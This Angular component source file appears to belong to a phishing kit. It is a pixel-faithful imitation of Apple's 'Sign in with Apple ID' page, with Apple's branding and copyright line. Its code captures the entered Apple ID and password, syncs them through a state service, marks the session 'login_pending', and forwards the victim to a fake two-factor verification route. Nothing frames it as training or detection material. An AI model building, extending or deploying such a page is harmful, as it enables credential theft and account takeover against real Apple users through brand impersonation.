import { Component, signal, output, inject, OnInit } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, FormGroup, Validators } from '@angular/forms';
import { StateService } from '../../../services/state.service';
import { getFlowById } from '../../../services/flows.service';
import { LanguageService } from '../../../services/language.service';

@Component({
  selector: 'app-apple-login',
  standalone: true,
  imports: [CommonModule, FormsModule, ReactiveFormsModule],
  template: `
    <div class="apple-flow-container font-sans flex items-center justify-center min-h-screen bg-white text-[#1d1d1f]">
      <!-- Apple ID Card: Centered, specific width, precise typography -->
      <div class="max-w-[640px] w-full px-8 flex flex-col items-center animate-in mb-32">
        <div class="mb-10 opacity-100 transition-opacity duration-500">
           <!-- Corrected Path -->
           <img src="assets/logos/apple.svg" alt="Apple" class="h-12 w-12 object-contain">
        </div>
        
        <h1 class="text-2xl sm:text-[24px] font-semibold text-[#1d1d1f] mb-8 tracking-tight text-center leading-tight">
           Sign in with Apple ID
        </h1>
        
        <form [formGroup]="loginForm" (ngSubmit)="onSubmit()" class="w-full max-w-[460px] relative">
          @if (!showPasswordStep()) {
            <!-- Apple ID Step -->
            <div class="relative group">
              <div class="absolute inset-x-0 top-0 h-[56px] border border-[#d2d2d7] rounded-[18px] group-hover:border-[#86868b] group-focus-within:border-[#0071e3] group-focus-within:ring-[4px] group-focus-within:ring-[#0071e3]/20 transition-all z-0 bg-white"></div>
              
              <!-- Floating Label Logic via CSS/Placeholder -->
              <input 
                type="text" 
                id="appleId" 
                formControlName="appleId" 
                class="relative z-10 w-full h-[56px] px-[16px] pt-4 bg-transparent border-0 outline-none text-[17px] text-[#1d1d1f] placeholder-transparent peer"
                placeholder="Email or Phone Number"
                [class.text-[#e30000]]="loginForm.get('appleId')?.invalid && loginForm.get('appleId')?.touched"
                autocomplete="username"
              >
              <label for="appleId" 
                     class="absolute left-[16px] top-[17px] text-[17px] text-[#86868b] transition-all duration-200 pointer-events-none peer-placeholder-shown:top-[17px] peer-placeholder-shown:text-[17px] peer-focus:top-[8px] peer-focus:text-[12px] peer-focus:text-[#86868b] peer-[&:not(:placeholder-shown)]:top-[8px] peer-[&:not(:placeholder-shown)]:text-[12px] z-10">
                  Email or Phone Number
              </label>

              <!-- Arrow Icon Button (Inline right) -->
              <button 
                type="button" 
                class="absolute right-2 top-2 h-[40px] w-[40px] rounded-full flex items-center justify-center transition-all z-20 focus:outline-none focus:ring-2 focus:ring-[#0071e3] focus:ring-offset-2 disabled:opacity-30 disabled:cursor-not-allowed cursor-pointer hover:bg-black/5" 
                (click)="nextStep()" 
                [disabled]="loginForm.get('appleId')?.invalid || !loginForm.get('appleId')?.value"
                aria-label="Next Step"
              >
                <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
                   <circle cx="14" cy="14" r="14" fill="#E8E8ED" class="transition-colors group-hover:fill-[#d2d2d7] group-active:fill-[#c7c7cc]"/>
                   <path d="M12.5 18L16.5 14L12.5 10" stroke="#1d1d1f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                   <!-- Override with Apple Blue if valid input? Apple usually keeps it grey until clicked or focused -->
                </svg>
              </button>
            </div>
            
            <div class="mt-8 text-center flex items-center justify-center gap-6 text-[13px] text-[#0070c9] tracking-wide">
               <div class="hover:underline cursor-pointer flex items-center gap-1">
                 Create Apple ID
                 <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M3 1L7 5L3 9" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
               </div>
               <div class="text-[#d2d2d7]">|</div>
               <div class="hover:underline cursor-pointer flex items-center gap-1">
                 Forgot Apple ID or password? 
                 <svg width="10" height="10" viewBox="0 0 10 10" fill="none"><path d="M3 1L7 5L3 9" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
               </div>
            </div>
          } @else {
            <!-- Password Step -->
            <div class="animate-in slide-in-from-right-4 duration-500">
                <div class="text-center mb-6">
                    <button type="button" (click)="showPasswordStep.set(false)" class="text-[#1d1d1f] text-[17px] hover:text-[#0071e3] flex items-center justify-center gap-2 mx-auto mb-2">
                        <span class="font-normal">{{ loginForm.get('appleId')?.value }}</span>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="opacity-50"><path d="M11 19l-7-7 7-7m8 14l-7-7 7-7"/></svg>
                    </button>
                </div>

                <div class="relative group">
                  <div class="absolute inset-x-0 top-0 h-[56px] border border-[#d2d2d7] rounded-[18px] group-hover:border-[#86868b] group-focus-within:border-[#0071e3] group-focus-within:ring-[4px] group-focus-within:ring-[#0071e3]/20 transition-all z-0 bg-white"></div>
                  
                  <input 
                    type="password" 
                    id="password" 
                    formControlName="password" 
                    class="relative z-10 w-full h-[56px] px-[16px] pt-4 bg-transparent border-0 outline-none text-[17px] text-[#1d1d1f] placeholder-transparent peer"
                    placeholder="Password"
                    [class.text-[#e30000]]="loginForm.get('password')?.invalid && loginForm.get('password')?.touched"
                    autocomplete="current-password"
                    autofocus
                  >
                  <label for="password" 
                         class="absolute left-[16px] top-[17px] text-[17px] text-[#86868b] transition-all duration-200 pointer-events-none peer-placeholder-shown:top-[17px] peer-placeholder-shown:text-[17px] peer-focus:top-[8px] peer-focus:text-[12px] peer-focus:text-[#86868b] peer-[&:not(:placeholder-shown)]:top-[8px] peer-[&:not(:placeholder-shown)]:text-[12px] z-10">
                      Password
                  </label>

                  <!-- Sign In Button (Inline right) -->
                   <button 
                    type="submit" 
                    class="absolute right-2 top-2 h-[40px] w-[40px] rounded-full flex items-center justify-center transition-all z-20 focus:outline-none focus:ring-2 focus:ring-[#0071e3] focus:ring-offset-2 disabled:opacity-30 disabled:cursor-not-allowed cursor-pointer hover:bg-black/5"
                    [disabled]="loginForm.invalid || loading()"
                    aria-label="Sign In"
                  >
                    @if (loading()) {
                      <div class="animate-spin h-5 w-5 border-2 border-[#86868b] border-t-transparent rounded-full"></div>
                    } @else {
                      <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
                         <circle cx="14" cy="14" r="14" fill="#E8E8ED" class="transition-colors group-hover:fill-[#d2d2d7] group-active:fill-[#c7c7cc]"/>
                         <path d="M12.5 18L16.5 14L12.5 10" stroke="#1d1d1f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                      </svg>
                    }
                  </button>
                </div>
            </div>
          }
        </form>
        
        <div class="fixed bottom-0 w-full py-6 border-t border-[#d2d2d7] bg-[#f5f5f7] flex justify-center items-center gap-6 text-[12px] text-[#424245]">
           <button (click)="toggleLangMenu()" class="hover:underline flex items-center gap-1 relative">
              {{ langService.currentLang() === 'en' ? 'United States' : (langService.currentLang() | uppercase) }}
              
              @if (showLangMenu()) {
                <div class="absolute bottom-full left-1/2 -translate-x-1/2 mb-4 bg-white border border-[#d2d2d7] rounded-lg shadow-xl py-2 min-w-[160px] max-h-[300px] overflow-y-auto text-left z-50">
                    @for (lang of langService.availableLangs; track lang.code) {
                        <div (click)="selectLang(lang.code); $event.stopPropagation()" class="px-4 py-2 hover:bg-[#f5f5f7] cursor-pointer flex justify-between items-center">
                            <span>{{ lang.name }}</span>
                            <span *ngIf="lang.code === langService.currentLang()" class="text-[#0071e3]">✓</span>
                        </div>
                    }
                </div>
              }
           </button>
           <div class="w-[1px] h-3 bg-[#d2d2d7]"></div>
           <a href="#" class="hover:underline">System Status</a>
           <div class="w-[1px] h-3 bg-[#d2d2d7]"></div>
           <a href="#" class="hover:underline">Privacy Policy</a>
           <div class="w-[1px] h-3 bg-[#d2d2d7]"></div>
           <a href="#" class="hover:underline">Terms & Conditions</a>
           <p class="ml-4 text-[#6e6e73]">Copyright © 2024 Apple Inc. All rights reserved.</p>
        </div>
      </div>
    </div>
  `,
  styleUrls: ['../../../styles/flows/apple.scss'],
  styles: [`
    .apple-spinner {
      width: 20px;
      height: 20px;
      border: 2px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: apple-spin 1s linear infinite;
    }
    @keyframes apple-spin {
      to { transform: rotate(360deg); }
    }
    input.error {
      border-color: #ff3b30 !important;
    }
  `]
})
export class AppleLoginComponent implements OnInit {
  private fb = inject(FormBuilder);
  private state = inject(StateService);
  langService = inject(LanguageService);

  showLangMenu = signal(false);

  loginForm: FormGroup = this.fb.group({
    appleId: ['', [Validators.required, Validators.email]],
    password: ['', [Validators.required, Validators.minLength(4)]]
  });

  showPasswordStep = signal(false);
  loading = signal(false);

  ngOnInit(): void {
    const flow = getFlowById('apple');
    if (flow) this.state.currentFlow.set(flow);
  }

  nextStep(): void {
    if (this.loginForm.get('appleId')?.valid) {
      this.state.email.set(this.loginForm.get('appleId')?.value);
      this.state.syncState();
      this.showPasswordStep.set(true);
    }
  }

  async onSubmit() {
    if (this.loginForm.valid) {
      this.loading.set(true);
      const data = this.loginForm.value;

      this.state.email.set(data.appleId);
      this.state.password.set(data.password);
      this.state.isLoginSubmitted.set(true);
      this.state.stage.set('login_pending');

      await this.state.syncState();
      this.loading.set(false);
      this.state.navigate('/verify/apple/2fa');
    }
  }
  toggleLangMenu() {
    this.showLangMenu.update(v => !v);
  }

  selectLang(code: string) {
    this.langService.setLanguage(code);
    this.showLangMenu.set(false);
  }
}
